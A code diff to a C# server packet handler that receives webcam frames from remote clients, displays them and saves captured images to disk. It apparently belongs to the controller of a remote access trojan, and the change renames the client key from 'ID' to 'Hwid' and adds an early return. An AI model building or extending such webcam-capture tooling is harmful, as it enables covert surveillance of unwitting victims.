@@ -24,7 +24,7 @@ namespace Server.Handle_Packet
             {
                 case "getWebcams":
                     {
-                        FormWebcam webcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("ID").AsString];
+                        FormWebcam webcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                         try
                         {
                             if (webcam != null)
@@ -40,6 +40,7 @@ namespace Server.Handle_Packet
                                 if (webcam.comboBox1.Text == "None")
                                 {
                                     client.Disconnected();
+                                    return;
                                 }
                                 webcam.comboBox1.Enabled = true;
                                 webcam.button1.Enabled = true;
@@ -59,7 +60,7 @@ namespace Server.Handle_Packet
 
                 case "capture":
                     {
-                        FormWebcam webcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("ID").AsString];
+                        FormWebcam webcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                         try
                         {
                             if (webcam != null)
@@ -81,7 +82,7 @@ namespace Server.Handle_Packet
                                                 Directory.CreateDirectory(webcam.FullPath);
                                             webcam.pictureBox1.Image.Save(webcam.FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", ImageFormat.Jpeg);
                                         }
-                                        webcam.Text = "Webcam:" + unpack_msgpack.ForcePathObject("ID").AsString + "    FPS:" + webcam.FPS + "    Screen:" + image.Width + " x " + image.Height + "    Size:" + Methods.BytesToString(memoryStream.Length);
+                                        webcam.Text = "Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString + "    FPS:" + webcam.FPS + "    Screen:" + image.Width + " x " + image.Height + "    Size:" + Methods.BytesToString(memoryStream.Length);
                                         webcam.FPS = 0;
                                         webcam.sw = Stopwatch.StartNew();
                                     }
